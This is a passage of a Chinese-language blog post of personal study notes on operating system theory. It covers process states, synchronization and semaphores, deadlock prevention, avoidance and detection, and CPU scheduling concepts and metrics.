是文件系统中<strong>连接“用户”和“磁盘数据”之间的桥梁</strong>。其主要作用包括：<ol><li>描述文件属性</li><li>指示文件位置</li><li>支持文件访问控制</li><li>支持文件读写操作</li><li>管理文件状态</li></ol></li></ol></li><li>简述设备按传输速率分类的三种主要类型及其特点</li><li></li></ol><h2 id="1-导图：Map：操作系统"><a href="#1-导图：Map：操作系统" class="headerlink" title="1. 导图：Map：操作系统"></a>1. 导图：<a href="Map%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.xmind">Map：操作系统</a></h2><hr><h2 id="2-操作系统"><a href="#2-操作系统" class="headerlink" title="2. 操作系统"></a>2. 操作系统</h2><h3 id="2-1-操作系统概述"><a href="#2-1-操作系统概述" class="headerlink" title="2.1. 操作系统概述"></a>2.1. 操作系统概述</h3><p>操作系统（OS）是一类系统<strong>软件</strong>，负责管理计算机的硬件资源、协调应用程序的执行，并为用户提供操作界面，其主要实现了以下功能：</p><ol><li>&#x3D;&#x3D;进程管理&#x3D;&#x3D;：<ol><li>负责进程的生命周期管理与协调，确保多任务环境下的高效运行。</li><li>主要包括：<ol><li>进程的创建、终止、挂起与恢复</li><li>进程间的同步与通信机制（如信号量、管道、消息队列）</li><li>进程状态管理与切换（如就绪、运行、阻塞）</li><li>死锁的预防与检测</li></ol></li></ol></li><li>&#x3D;&#x3D;处理机管理（CPU 管理）&#x3D;&#x3D;：<ol><li>专注于 CPU 资源的分配与调度，在操作系统课程中，通常作为进程管理的子模块</li><li>主要包括：<ol><li>处理机调度策略（如先来先服务、优先级调度、时间片轮转等）</li><li>中断处理与上下文切换，确保 CPU 高效利用</li></ol></li></ol></li><li>&#x3D;&#x3D;存储器管理（内存管理）&#x3D;&#x3D;：<ol><li>高效、安全地管理系统内存，满足程序运行时的内存需求并确保进程隔离</li><li>主要包括：<ol><li>内存的动态分配与回收（如堆管理、内存池）</li><li>地址映射与转换（如逻辑地址到物理地址的转换）</li><li>内存保护与共享机制（如页面保护、段共享）</li><li>虚拟内存实现（如分页、页面置换算法）</li></ol></li></ol></li><li>&#x3D;&#x3D;文件管理&#x3D;&#x3D;：<ol><li>将底层存储设备组织为逻辑文件系统，便于数据的存储、访问与管理</li><li>主要包括：<ol><li>文件存储空间的分配与回收（如空闲块管理）</li><li>目录结构的管理与文件路径解析</li><li>文件的读写控制与访问权限管理（如ACL、权限位）</li><li>文件系统的可靠性与性能优化（如日志、缓存）</li></ol></li></ol></li><li>&#x3D;&#x3D;设备管理&#x3D;&#x3D;：<ol><li>协调多种外部设备的使用，提升输入&#x2F;输出（I&#x2F;O）操作的效率与并发性</li><li>主要包括：<ol><li>I&#x2F;O 缓冲区管理，减少设备访问延迟</li><li>设备的分配、调度与回收（如设备驱动程序）</li><li>设备请求的处理与中断机制</li><li>虚拟设备支持（如虚拟磁盘、虚拟终端）</li></ol></li></ol></li><li>&#x3D;&#x3D;网络管理&#x3D;&#x3D;：<ol><li>管理网络通信，支持计算机之间的数据交换与资源共享</li><li>主要包括：<ol><li>网络协议栈的实现与管理（如TCP&#x2F;IP）</li><li>网络连接的建立、维护与断开</li><li>网络安全与访问控制（如防火墙、加密）</li><li>分布式系统的资源共享与通信</li></ol></li></ol></li><li>&#x3D;&#x3D;提供用户接口&#x3D;&#x3D;：<ol><li>提供用户与计算机交互的接口，便于操作与控制</li><li>主要包括：<ol><li>命令行界面（CLI），如 Shell 终端</li><li>图形用户界面（GUI），如Windows、GNOME</li><li>其他交互方式，如触摸界面或语音控制</li></ol></li></ol></li></ol><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250603111913745.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>不要把操作系统仅仅看作是对硬件的管理者，它管理的是计算机资源。</li><li>凡是你在计算机中能叫出名字的资源，无论是硬件设备、内存空间、文件、进程，还是各种逻辑资源，基本都在操作系统的管理范围之内。</li></ol></blockquote><hr><h2 id="3-进程管理"><a href="#3-进程管理" class="headerlink" title="3. 进程管理"></a>3. 进程管理</h2><h3 id="3-1-进程概述"><a href="#3-1-进程概述" class="headerlink" title="3.1. 进程概述"></a>3.1. 进程概述</h3><p>进程（Process），是计算机中的程序关于某个数据集合的一次运行活动，是系统进行 <strong>资源分配和调度</strong> 的一个基本单位，我们简单理解为：一个进程就是一个程序在操作系统中实际运行时的一个实例</p><p>在早期的分时系统中，进程是操作系统进行任务调度和执行的基本单位。然而，在现代操作系统中，我们引入了线程（Thread）的概念，进程不再是基本的执行单位，而是作为<strong>线程的容器</strong>存在，真正被调度和执行的单元变成了线程。</p><hr><h3 id="3-2-进程的状态"><a href="#3-2-进程的状态" class="headerlink" title="3.2. 进程的状态"></a>3.2. 进程的状态</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250604120226825.png"></p><ol><li>&#x3D;&#x3D;创建状态&#x3D;&#x3D;：<ol><li>当用户或系统请求创建一个新进程时，操作系统会为其分配必要的资源，例如在内核中创建进程控制块（PCB）、将装入程序加载到内存等</li></ol></li><li>&#x3D;&#x3D;就绪状态&#x3D;&#x3D;：<ol><li><font color="#7030a0">活动就绪</font>：<ol><li>进程已完成创建，并具备所有执行条件（如所需的内存、资源、I&#x2F;O 等），可以随时被 CPU 调度</li><li>此时进程驻留在内存中，进入“活动就绪队列”（也称为就绪队列），等待 CPU 调度</li></ol></li><li><font color="#7030a0">静止就绪</font>：<ol><li>当高优先级进程或系统内存压力较大时，部分活动就绪进程可能被踢出主存，转存至二级存储（如交换区&#x2F;swap 空间或后备存储）</li><li>这类进程虽然不再占用主存，但其状态仍为“就绪”，即一旦被换入内存并获得 CPU 调度，即可立即运行</li><li>操作系统通常将其放入“静止就绪队列”（该队列本身位于内存中），等待后续的换入操作</li></ol></li></ol></li><li>&#x3D;&#x3D;运行状态&#x3D;&#x3D;：<ol><li>调度器从 “活动就绪队列” 中根据调度算法选择一个进程，将其上下文加载至 CPU 寄存器，并设置相应页表，使其进入 “运行” 状态</li><li>在该状态下，进程独占一个处理器核心（一个核只能处理一个指令流，假设进程为单指令流，即单线程）</li></ol></li><li>&#x3D;&#x3D;阻塞状态&#x3D;&#x3D;：<ol><li><font color="#7030a0">活动阻塞</font>：<ol><li>进程在运行过程中由于某些条件未满足（如等待 I&#x2F;O 完成或资源释放）而无法继续执行，此时将其移出 CPU 并置于阻塞队列中，状态变为“活动阻塞”</li><li>进程仍驻留在内存中，等待所依赖事件完成后再转为就绪状态</li><li><strong>不是说一个线程，一直等待莫，咋不一样还能被移除 CPU？算了到时候在管</strong></li></ol></li><li><font color="#7030a0">静止阻塞</font>：<ol><li>即通常所说的进程挂起。处于“活动阻塞”状态的进程，如果长时间无法继续执行，且系统内存紧张，可能会被操作系统换出（swapping out）到磁盘或其他后备存储，即使其所等待的 I&#x2F;O 或事件尚未完成，也会优先将其从主存中移除，以释放内存资源供其他进程使用</li><li>此时进程既不占用 CPU，也不占用主存，仍处于“等待事件”的状态。当该进程被换回内存后，才有可能继续运行</li></ol></li></ol></li><li>&#x3D;&#x3D;终止状态&#x3D;&#x3D;：<ol><li>当进程正常结束或发生异常退出时，会被标记为“终止”，随后操作系统将回收其占用的所有资源，包括内存空间、打开的文件、内核对象等</li></ol></li></ol><hr><h3 id="3-3-进程通信"><a href="#3-3-进程通信" class="headerlink" title="3.3. 进程通信"></a>3.3. 进程通信</h3><hr><h3 id="3-4-进程同步"><a href="#3-4-进程同步" class="headerlink" title="3.4. 进程同步"></a>3.4. 进程同步</h3><h4 id="3-4-1-进程同步概述"><a href="#3-4-1-进程同步概述" class="headerlink" title="3.4.1. 进程同步概述"></a>3.4.1. 进程同步概述</h4><p>进程同步并不是日常所说的数据同步，而是指在并发执行时，多个进程之间通过相互制约，按照特定顺序协同执行的过程，它依赖于两种不同的相互制约形式：</p><ol><li>&#x3D;&#x3D;间接相互制约关系（互斥）&#x3D;&#x3D;：<ol><li>指进程排他性地访问共享资源</li><li>典型场景如：多个进程不能同时访问同一段临界区，例如对同一个文件进行写操作</li></ol></li><li>&#x3D;&#x3D;直接相互制约关系（同步）&#x3D;&#x3D;：<ol><li>指多个进程之间需要协作，按一定顺序完成任务</li><li>比如一个进程负责写数据，另一个进程负责读数据，必须先写后读——这类典型例子就是管道通信、生产者-消费者问题</li></ol></li></ol><hr><h4 id="3-4-2-间接相互制约关系（互斥）"><a href="#3-4-2-间接相互制约关系（互斥）" class="headerlink" title="3.4.2. 间接相互制约关系（互斥）"></a>3.4.2. 间接相互制约关系（互斥）</h4><h5 id="3-4-2-1-临界资源的访问过程"><a href="#3-4-2-1-临界资源的访问过程" class="headerlink" title="3.4.2.1. 临界资源的访问过程"></a>3.4.2.1. 临界资源的访问过程</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605185358630.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>唤醒处于阻塞状态的进程时，可以选择只唤醒一个，也可以同时唤醒多个</li><li>那些阻塞进程会先来后到的进入阻塞队列</li></ol></blockquote><hr><h5 id="3-4-2-2-临界资源的访问原则"><a href="#3-4-2-2-临界资源的访问原则" class="headerlink" title="3.4.2.2. 临界资源的访问原则"></a>3.4.2.2. 临界资源的访问原则</h5><h2 id="临界资源的访问原则包括：1-空闲让进-：-1-当临界区空闲时，允许一个进程立即进入2-忙则等待-：-1-当已有进程在临界区内，其他进程必须等待（进入阻塞状态）3-有限等待-：-1-任何一个请求访问临界区的进程，其等待时间应是有限的，避免饥饿现象4-让权等待-：-1-当进程无法进入临界区时，应主动让出-CPU-的执行权，避免因持续占用-CPU-而产生“忙等待”，造成资源浪费-2-这也是为什么在进程阻塞时，CPU-会转而去调度执行其他就绪进程，以提高系统整体效率"><a href="#临界资源的访问原则包括：1-空闲让进-：-1-当临界区空闲时，允许一个进程立即进入2-忙则等待-：-1-当已有进程在临界区内，其他进程必须等待（进入阻塞状态）3-有限等待-：-1-任何一个请求访问临界区的进程，其等待时间应是有限的，避免饥饿现象4-让权等待-：-1-当进程无法进入临界区时，应主动让出-CPU-的执行权，避免因持续占用-CPU-而产生“忙等待”，造成资源浪费-2-这也是为什么在进程阻塞时，CPU-会转而去调度执行其他就绪进程，以提高系统整体效率" class="headerlink" title="临界资源的访问原则包括：1. &#x3D;&#x3D;空闲让进&#x3D;&#x3D;：    1. 当临界区空闲时，允许一个进程立即进入2. &#x3D;&#x3D;忙则等待&#x3D;&#x3D;：    1. 当已有进程在临界区内，其他进程必须等待（进入阻塞状态）3. &#x3D;&#x3D;有限等待&#x3D;&#x3D;：    1. 任何一个请求访问临界区的进程，其等待时间应是有限的，避免饥饿现象4. &#x3D;&#x3D;让权等待&#x3D;&#x3D;：    1. 当进程无法进入临界区时，应主动让出 CPU 的执行权，避免因持续占用 CPU 而产生“忙等待”，造成资源浪费    2. 这也是为什么在进程阻塞时，CPU 会转而去调度执行其他就绪进程，以提高系统整体效率    "></a>临界资源的访问原则包括：<br>1. &#x3D;&#x3D;空闲让进&#x3D;&#x3D;：<br>    1. 当临界区空闲时，允许一个进程立即进入<br>2. &#x3D;&#x3D;忙则等待&#x3D;&#x3D;：<br>    1. 当已有进程在临界区内，其他进程必须等待（进入阻塞状态）<br>3. &#x3D;&#x3D;有限等待&#x3D;&#x3D;：<br>    1. 任何一个请求访问临界区的进程，其等待时间应是有限的，避免饥饿现象<br>4. &#x3D;&#x3D;让权等待&#x3D;&#x3D;：<br>    1. 当进程无法进入临界区时，应主动让出 CPU 的执行权，避免因持续占用 CPU 而产生“忙等待”，造成资源浪费<br>    2. 这也是为什么在进程阻塞时，CPU 会转而去调度执行其他就绪进程，以提高系统整体效率    </h2><h5 id="3-4-2-3-临界互斥的软件方法（基本方法）"><a href="#3-4-2-3-临界互斥的软件方法（基本方法）" class="headerlink" title="3.4.2.3. 临界互斥的软件方法（基本方法）"></a>3.4.2.3. 临界互斥的软件方法（基本方法）</h5><h6 id="3-4-2-3-1-单标志法"><a href="#3-4-2-3-1-单标志法" class="headerlink" title="3.4.2.3.1. 单标志法"></a>3.4.2.3.1. 单标志法</h6><h6 id="3-4-2-3-2-双标志法先检查"><a href="#3-4-2-3-2-双标志法先检查" class="headerlink" title="3.4.2.3.2. 双标志法先检查"></a>3.4.2.3.2. 双标志法先检查</h6><h6 id="3-4-2-3-3-双标志法后检查"><a href="#3-4-2-3-3-双标志法后检查" class="headerlink" title="3.4.2.3.3. 双标志法后检查"></a>3.4.2.3.3. 双标志法后检查</h6><h6 id="3-4-2-3-4-皮特森算法"><a href="#3-4-2-3-4-皮特森算法" class="headerlink" title="3.4.2.3.4. 皮特森算法"></a>3.4.2.3.4. 皮特森算法</h6><hr><h5 id="3-4-2-4-临界互斥的硬件方法（基本方法）"><a href="#3-4-2-4-临界互斥的硬件方法（基本方法）" class="headerlink" title="3.4.2.4. 临界互斥的硬件方法（基本方法）"></a>3.4.2.4. 临界互斥的硬件方法（基本方法）</h5><hr><h5 id="3-4-2-5-信号量（临界互斥的高级方法）"><a href="#3-4-2-5-信号量（临界互斥的高级方法）" class="headerlink" title="3.4.2.5. 信号量（临界互斥的高级方法）"></a>3.4.2.5. 信号量（临界互斥的高级方法）</h5><h6 id="3-4-2-5-1-信号量概述"><a href="#3-4-2-5-1-信号量概述" class="headerlink" title="3.4.2.5.1. 信号量概述"></a>3.4.2.5.1. 信号量概述</h6><p>信号量是实现临界互斥的高级方法，是我们大名鼎鼎的 唤醒—等待操作，主要有：</p><ol><li>整型信号量</li><li>记录型信号量</li></ol><hr><h6 id="3-4-2-5-2-整形信号量"><a href="#3-4-2-5-2-整形信号量" class="headerlink" title="3.4.2.5.2. 整形信号量"></a>3.4.2.5.2. 整形信号量</h6><p>缺点是是 CPU 忙等<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605192232877.png"></p><hr><h6 id="3-4-2-5-3-记录型信号量"><a href="#3-4-2-5-3-记录型信号量" class="headerlink" title="3.4.2.5.3. 记录型信号量"></a>3.4.2.5.3. 记录型信号量</h6><p>解决 CPU 忙等问题<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605191804066.png"></p><hr><h4 id="3-4-3-死锁"><a href="#3-4-3-死锁" class="headerlink" title="3.4.3. 死锁"></a>3.4.3. 死锁</h4><h5 id="3-4-3-1-死锁概述"><a href="#3-4-3-1-死锁概述" class="headerlink" title="3.4.3.1. 死锁概述"></a>3.4.3.1. 死锁概述</h5><p>死锁是指多个进程因竞争资源而相互等待，导致彼此陷入阻塞状态，若无外力干预，这些进程将永远无法继续执行。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>与此类似的概念是饥饿：指进程长时间得不到所需资源，虽然还能继续推进，但响应和进度受到明显影响，呈现“饿而不死”的状态。</li></ol></blockquote><hr><h5 id="3-4-3-2-死锁产生的原因"><a href="#3-4-3-2-死锁产生的原因" class="headerlink" title="3.4.3.2. 死锁产生的原因"></a>3.4.3.2. 死锁产生的原因</h5><p>死锁产生的原因有：</p><ol><li>系统资源的竞争</li><li>进程推进顺序非法</li></ol><hr><h5 id="3-4-3-3-死锁产生的必要条件"><a href="#3-4-3-3-死锁产生的必要条件" class="headerlink" title="3.4.3.3. 死锁产生的必要条件"></a>3.4.3.3. 死锁产生的必要条件</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605203459668.png"></p><hr><h5 id="3-4-3-4-死锁的预防"><a href="#3-4-3-4-死锁的预防" class="headerlink" title="3.4.3.4. 死锁的预防"></a>3.4.3.4. 死锁的预防</h5><p>&#x3D;&#x3D;1.破坏互斥条件&#x3D;&#x3D;<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605203754645.png"></p><p>&#x3D;&#x3D;2.破坏不可剥夺条件&#x3D;&#x3D;<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605204107933.png"></p><p>&#x3D;&#x3D;3.破坏请求并保持条件&#x3D;&#x3D;<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605204157303.png"></p><p>&#x3D;&#x3D;4.破坏循环等待条件&#x3D;&#x3D;<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605204314508.png"></p><hr><h5 id="3-4-3-5-死锁的避免"><a href="#3-4-3-5-死锁的避免" class="headerlink" title="3.4.3.5. 死锁的避免"></a>3.4.3.5. 死锁的避免</h5><p>也就是我们大名鼎鼎的银行家算法，进程需要在开始时向操作系统声明其<strong>最大可能资源需求</strong>，以图中的 P0 为例，声明的最大需求为 10 个资源，当前已分配了 5 个。</p><p>现在 P0 向操作系统申请 6 个资源，OS 一计算：你这次要 6 个，加上已有的 5 个，总共就是 11 个，已经超过了你最初声明的最大需求 —— 操作系统据此预判此请求<strong>可能导致系统进入不安全状态</strong>（即可能引发死锁），于是<strong>拒绝请求</strong>。</p><p>如果 P0 这次只申请 5 个资源，虽然总需求没有超过最大值，但操作系统检查当前<strong>可用资源数为 3 个</strong>，仍无法满足请求，因此也会<strong>拒绝分配</strong>。<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605205200815.png"></p><hr><h5 id="3-4-3-6-死锁的检测"><a href="#3-4-3-6-死锁的检测" class="headerlink" title="3.4.3.6. 死锁的检测"></a>3.4.3.6. 死锁的检测</h5><h6 id="3-4-3-6-1-死锁的检测概述"><a href="#3-4-3-6-1-死锁的检测概述" class="headerlink" title="3.4.3.6.1. 死锁的检测概述"></a>3.4.3.6.1. 死锁的检测概述</h6><p>即便我们有了死锁的预防和死锁的避免机制，也不能保证系统就绝对不会发生死锁。比如在程序运行过程中，可能会人为动态地创建线程或进程，这些行为是操作系统事先无法完全预测的，而新的资源请求也可能引发死锁。</p><p>那么一旦死锁真的发生了，我们该如何检测？其实方法就是：绘制资源分配图，然后根据死锁定理来判断当前是否存在死锁。</p><hr><h6 id="3-4-3-6-2-资源分配图"><a href="#3-4-3-6-2-资源分配图" class="headerlink" title="3.4.3.6.2. 资源分配图"></a>3.4.3.6.2. 资源分配图</h6><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605210113393.png"></p><hr><h6 id="3-4-3-6-3-资源分配图的简化"><a href="#3-4-3-6-3-资源分配图的简化" class="headerlink" title="3.4.3.6.3. 资源分配图的简化"></a>3.4.3.6.3. 资源分配图的简化</h6><p>资源分配图的简化就是去找那些不是孤点（即存在分配边或请求边）、不处于阻塞状态（即其请求的资源当前可满足）的点。</p><p>如上图所示：  R1 为 P0 分配了 2 个资源，为 P1 分配了 1 个资源，此时 R1 中没有剩余资源；  R2 为 P1 分配了 1 个资源，当前仍剩下 1 个资源。</p><p>我们先看 P0：P0 正在向 R2 请求一个资源，而 R2 中还有资源可用，说明 P0 能够获取资源，满足条件；<br>然后再看 P1：P1 正在向 R1 请求资源，但 R1 当前没有可用资源，不满足条件，处于阻塞状态。</p><p>因此，我们将满足条件的 P0 的所有请求边和分配边从图中删除，如下图所示：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605211455385.png"></p><p>随后，P0 执行完成并归还其占用的所有资源。这时 R1 中恢复了两个资源。我们再次观察 P1：此时它请求 R1 的资源，而 R1 已有空闲资源，因此 P1 现在满足条件。于是我们也将 P1 的出边和入边删除，如下图所示：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605211635746.png"></p><p>所以这是一个完全简化过程，说明此状态下不存在死锁，对应的进程执行顺序可以表示为：P0 → P1</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果最终资源分配图无法被完全简化——也就是说，还有一部分进程和资源残留在图中，始终找不到能继续推进的进程，这就叫做不完全简化。</li></ol></blockquote><hr><h6 id="3-4-3-6-4-死锁定理"><a href="#3-4-3-6-4-死锁定理" class="headerlink" title="3.4.3.6.4. 死锁定理"></a>3.4.3.6.4. 死锁定理</h6><p>死锁定理是判定系统是否已发生死锁的充分条件。一旦触发死锁定理，即说明系统中确实存在死锁。</p><p>该定理的内容是：当且仅当资源分配图在当前状态下<strong>不可完全简化</strong>时，系统已进入死锁状态。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>这里的“简化过程”类似于“拓扑排序”的方式</li></ol></blockquote><hr><h5 id="3-4-3-7-死锁的解除"><a href="#3-4-3-7-死锁的解除" class="headerlink" title="3.4.3.7. 死锁的解除"></a>3.4.3.7. 死锁的解除</h5><p>死锁的解除通常有以下几个方式：</p><ol><li>&#x3D;&#x3D;资源剥夺&#x3D;&#x3D;：<ol><li>挂起死锁进程</li><li>剥夺其资源</li><li>将资源分配给其他死锁进程</li></ol></li><li>&#x3D;&#x3D;撤销进程&#x3D;&#x3D;</li><li>&#x3D;&#x3D;进程回退&#x3D;&#x3D;：<ol><li>回退到足以避免死锁的地步</li><li>这个方式需要记录进程的历史信息，设置还原点</li></ol></li></ol><hr><h2 id="4-处理机管理"><a href="#4-处理机管理" class="headerlink" title="4. 处理机管理"></a>4. 处理机管理</h2><h3 id="4-1-处理机调度"><a href="#4-1-处理机调度" class="headerlink" title="4.1. 处理机调度"></a>4.1. 处理机调度</h3><h4 id="4-1-1-处理机调度概述"><a href="#4-1-1-处理机调度概述" class="headerlink" title="4.1.1. 处理机调度概述"></a>4.1.1. 处理机调度概述</h4><p>处理器调度是指：操作系统从 <strong>就绪队列</strong> 中选择一个进程，并将某一个核心的 CPU 控制权分配给该进程，以执行其指令的过程。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>在任意时刻，一个处理器核心只能执行一条指令流，该指令流可能来自一个单线程进程，也可能是某个多线程进程中的一个线程</li><li>因为早期多数应用为单线程进程应用，因此 “将 CPU 控制权分配给进程” 这一说法通常默认该进程只包含一个线程。毕竟，一个核心在任一时刻只能执行一个指令流。</li></ol></blockquote><hr><h4 id="4-1-2-处理机调度的层次"><a href="#4-1-2-处理机调度的层次" class="headerlink" title="4.1.2. 处理机调度的层次"></a>4.1.2. 处理机调度的层次</h4><ol><li>&#x3D;&#x3D;高级调度（作业调度）&#x3D;&#x3D;：<ol><li>负责从外存（硬盘）中选择作业（程序）加载到内存中创建成进程的过程</li></ol></li><li>&#x3D;&#x3D;中级调度（内存对换）&#x3D;&#x3D;：<ol><li>控制在内存中运行的进程数量，把暂时不用的进程换出到磁盘，条件合适再调入内存（也就是进程挂起）</li></ol></li><li>&#x3D;&#x3D;低级调度（进程调度）&#x3D;&#x3D;：<ol><li>从就绪队列中选择一个进程把 CPU 分给它，这就是我们平时说的 “调度算法” 的核心所在</li></ol></li></ol><p>下图是高级调度（作业调度）的示意图：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605155209835.png"></p><hr><h4 id="4-1-3-处理机调度的方式"><a href="#4-1-3-处理机调度的方式" class="headerlink" title="4.1.3. 处理机调度的方式"></a>4.1.3. 处理机调度的方式</h4><ol><li>&#x3D;&#x3D;剥夺式调度（抢占式调度）&#x3D;&#x3D;：<ol><li>一个进程运行中可能会被强行中断（如被更高优先级的抢占、时间片用完等）</li></ol></li><li>&#x3D;&#x3D;非剥夺式调度（非抢占式调度）&#x3D;&#x3D;：<ol><li>进程一旦获得 CPU，就会运行到它主动放弃为止（如运行结束或进入阻塞状态），适用于批处理系统，不适用于分时 &#x2F; 实时 系统</li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>再非剥夺式调度下，即便进程时间片用完，也一直会运行下去，直到它主动释放 CPU</li></ol></blockquote><hr><h4 id="4-1-4-处理机调度的时机（触发条件）"><a href="#4-1-4-处理机调度的时机（触发条件）" class="headerlink" title="4.1.4. 处理机调度的时机（触发条件）"></a>4.1.4. 处理机调度的时机（触发条件）</h4><p>处理机调度的常见时机有：</p><ol><li>进程运行完毕</li><li>进程时间片用完</li><li>进程要求 I&#x2F;O 操作（进入阻塞状态）</li><li>执行某种原语操作</li><li>高优先级进程申请运行</li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>到底是否会触发调度，取决于处理机的调度策略。例如：在剥夺式调度中，进程时间片用完后可以被调度，而在非剥夺式调度中则不会；高优先级进程请求运行时，是否能立即调度同样取决于调度方式。</li></ol></blockquote><hr><h4 id="4-1-5-处理机调度的过程（进程调度）"><a href="#4-1-5-处理机调度的过程（进程调度）" class="headerlink" title="4.1.5. 处理机调度的过程（进程调度）"></a>4.1.5. 处理机调度的过程（进程调度）</h4><p>处理机调度的过程大致为：</p><ol><li>&#x3D;&#x3D;保存当前进程状态&#x3D;&#x3D;：<ol><li>如果当前有进程正在运行，而调度器决定换出它（即不是因为它自己退出），则需要先保存它的运行状态到该进程的 PCB（进程控制块）中</li><li>这是为了确保未来该进程还能从断点位置继续执行</li></ol></li><li>&#x3D;&#x3D;选择新进程&#x3D;&#x3D;：<ol><li>调度器根据调度算法（如FCFS、SJF、优先级、轮转等）从就绪队列中挑选一个合适的进程</li><li>一旦选中合适的进程，调度器会更新该进程的状态（就绪 -&gt; 运行）</li></ol></li><li>&#x3D;&#x3D;恢复新进程状态&#x3D;&#x3D;：<ol><li>系统准备让新进程运行，需要恢复它原先保存的状态，即从 PCB 中读取数据加载到 CPU 中</li></ol></li><li>&#x3D;&#x3D;跳转执行新进程&#x3D;&#x3D;：<ol><li>操作系统将 CPU 控制权交给新进程，CPU 从新进程的程序计数器指示的位置继续执行，直到下一次调度</li></ol></li></ol><hr><h4 id="4-1-6-处理机调度的评价指标"><a href="#4-1-6-处理机调度的评价指标" class="headerlink" title="4.1.6. 处理机调度的评价指标"></a>4.1.6. 处理机调度的评价指标</h4><ol><li>&#x3D;&#x3D;CPU 利用率（越高越好）&#x3D;&#x3D;：<ol><li>CPU 利用率 &#x3D; CPU 忙碌时间 &#x2F; 总时间</li></ol></li><li>&#x3D;&#x3D;系统吞吐量（越高越好）&#x3D;&#x3D;：<ol><li>表示单位时间内系统完成的作业数量</li><li>系统吞吐量 &#x3D; 完成的作业数 &#x2F; 总时间</li></ol></li><li>&#x3D;&#x3D;周转时间（越低越好）&#x3D;&#x3D;：<ul><li>指作业从提交到完成所经历的总时间</li><li>周转时间 &#x3D; 完成时间 - 提交时间</li></ul></li><li>&#x3D;&#x3D;带权周转时间（越低越好）&#x3D;&#x3D;：<ul><li>用于衡量作业被延迟的程度，相对考虑运行时间</li><li>带权周转时间 &#x3D; 周转时间 &#x2F; 实际运行时间</li></ul></li><li>&#x3D;&#x3D;等待时间（越低越好）&#x3D;&#x3D;：<ul><li>指作业在就绪队列中等待调度运行的总时间</li><li>通常是周转时间 - 实际运行时间 - I&#x2F;O 等待时间（如有）</li></ul></li><li>&#x3D;&#x3D;响应时间（越低越好）&#x3D;&#x3D;：<ul><li>指用户提交请求到系统首次产生响应的时间间隔</li><li>尤其关键于交互式系统和实时系统</li></ul></li></ol><hr><h4 id="4-1-7-处理机调度的常见算法"><a href="#4-1-7-处理机调度的常见算法" class="headerlink" title="4.1.7. 处理机调度的常见算法"></a>4.1.7. 处理机调度的常见算法</h4><h5 id="4-1-7-1-处理机调度的常见算法概述"><a href="#4-1-7-1-处理机调度的常见算法概述" class="headerlink" title="4.1.7.1. 处理机调度的常见算法概述"></a>4.1.7.1. 处理机调度的常见算法概述</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605164732952.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>不要以为处理器调度就一定是进程调度，也可能是作业调度</li></ol></blockquote><hr><h5 id="4-1-7-2-先来先服务（FCFS）"><a href="#4-1-7-2-先来先服务（FCFS）" class="headerlink" title="4.1.7.2. 先来先服务（FCFS）"></a>4.1.7.2. 先来先服务（FCFS）</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605181232101.png"></p><hr><h5 id="4-1-7-3-短作业优先（SJF）"><a href="#4-1-7-3-短作业优先（SJF）" class="headerlink" title="4.1.7.3. 